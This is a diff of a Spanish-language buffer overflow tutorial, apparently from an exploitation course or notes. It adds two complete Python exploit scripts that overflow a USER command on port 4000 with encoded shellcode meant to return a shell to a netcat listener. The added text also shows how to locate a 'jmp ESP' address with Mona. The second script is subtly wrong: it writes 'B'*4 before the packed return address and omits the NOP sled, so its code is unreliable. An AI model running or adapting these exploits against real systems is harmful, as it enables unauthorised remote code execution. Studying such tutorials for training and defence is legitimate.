@@ -435,9 +435,7 @@ except:
 ```
 La razón por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el **Immunity Debugger** para analizar instrucción a instrucción cómo se va produciendo el proceso de decodificación, así como probar a no insertar los NOP-sled a fin de corroborar como la ejecución de nuestro Shellcode no es funcional.
 
-Ya teniendo todo esto hecho, lo único que queda es ejecutar el script teniendo previamente una sesión vía Netcat en escucha. 
-
-Tras su ejecución, ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces sesión al sistema. Arreglaremos esto en el siguiente punto.
+Ya teniendo todo esto hecho, lo único que queda es encontrar una dirección de salto al registro ESP.
 
 #### Salto al ESP
 
@@ -464,13 +462,136 @@ nasm >
 
 ```
 
-Sabiendo que a nivel de OPCode, un 'jmp ESP' figura como FFE4, podemos a continuación desde Mona en la línea de comandos interactiva de *Immunity Debugger* realizar la siguiente consulta en la sección de módulos:
+Sabiendo que a nivel de OPCode, un '**jmp ESP**' figura como **FFE4**, podemos a continuación desde Mona en la línea de comandos interactiva de **Immunity Debugger** realizar la siguiente consulta en la sección de módulos:
 
 `find -s "\xff\xe4" -m modulo.dll`
 
 Suponiendo que se trata de una dll el módulo candidato que hemos encontrado. De manera inmediata, se nos datarán un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya dirección de memoria no posea badchars.
 
+Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **Immunity Debugger** como dicha dirección equivale a un jmp ESP. A modo de ejemplo, suponiendo que la dirección es 0x12131415, se deberían de aplicar al script los siguientes cambios:
 
+```python
+#!/usr/bin/python
+# coding: utf-8
+
+import sys,socket
+
+if len(sys.argv) != 2:
+  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  sys.exit(0)
+
+shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
+"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
+"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
+"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
+"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
+"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
+"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
+"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
+"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
+"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
+"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
+"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
+"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
+"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
+"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
+"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
+"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
+"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
+"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
+"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
+"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
+"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
+"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
+"\xc0\x8a\x41\xbe\xe1\x9e")
+
+buffer = "A"*809 + "\x15\x14\x13\x12" + "\x90"*16 + shellcode + "C"*(1300-809-4-16-351)
+
+ipAddress = sys.argv[1]
+
+port = 4000
+
+try:
+  print "Enviando búffer..."
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((ipAddress, port))
+  s.recv(1024)
+  s.send("USER " + buffer + '\r\n')
+  s.recv(1024)
+  s.close()
+except:
+  print "\nError de conexión...\n"
+  sys.exit(0)
+
+```
+
+Consiguiendo así que el registro **EIP** apunte a dicha dirección donde posteriormente se aplica el salto al registro **ESP**.
+
+Una manera más elegante y opcional de hacer las cosas es importando la siguiente librería en el script:
+
+```python
+from struct import pack
+```
+
+La funcionalidad del **pack** nos permite poner en formato _Little Endian_ una dirección pasada directamente sin tener que estar haciendo la conversión manualmente. Para ello, se debería adaptar el script a lo que se muestra a continuación:
+
+```python
+#!/usr/bin/python
+# coding: utf-8
+
+import sys,socket
+from struct import pack
+
+if len(sys.argv) != 2:
+  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  sys.exit(0)
+
+shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
+"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
+"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
+"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
+"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
+"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
+"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
+"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
+"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
+"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
+"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
+"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
+"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
+"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
+"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
+"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
+"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
+"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
+"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
+"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
+"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
+"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
+"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
+"\xc0\x8a\x41\xbe\xe1\x9e")
+
+buffer = "A"*809 + "B"*4 + pack('<L', 0x12131415) + shellcode + "C"*(1300-809-4-16-351)
+
+ipAddress = sys.argv[1]
+
+port = 4000
+
+try:
+  print "Enviando búffer..."
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((ipAddress, port))
+  s.recv(1024)
+  s.send("USER " + buffer + '\r\n')
+  s.recv(1024)
+  s.close()
+except:
+  print "\nError de conexión...\n"
+  sys.exit(0)
+
+```
+
+Ya con todo esto hecho, tras la ejecución del exploit teniendo una sesión de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.
 
 
 #### Mejorando el Exploit
